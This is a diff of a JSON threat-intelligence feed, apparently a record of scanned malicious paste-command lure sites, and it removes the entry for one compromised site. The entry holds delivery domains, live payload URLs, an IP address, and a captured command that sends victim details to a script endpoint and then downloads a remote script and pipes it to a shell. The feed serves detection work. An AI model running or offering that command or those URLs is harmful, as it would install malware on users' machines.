@@ -569,35 +569,5 @@
     ],
     "ReportId": "cmwetnpgn0e5q0omlfbiurb7r",
     "ScannedAt": "2026-11-13T10:16:26.023000+00:00"
-  },
-  {
-    "UrlDomain": "soloflightdesign.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "quietshalecompany.com",
-      "simplecopseholding.com",
-      "generatoryieldlab.com",
-      "script-six-tawny.vercel.app",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "141.193.213.11"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=a63b59e2-3190-4cd7-a9fb-b9603df4767c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsoloflightdesign[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-13T09%3A26%3A58.006Z&lastShellAt=2026-11-13T09%3A26%3A58.006Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwerxwap0e0d0omlo90ozon6",
-    "ScannedAt": "2026-11-13T09:28:22.206000+00:00"
   }
 ]
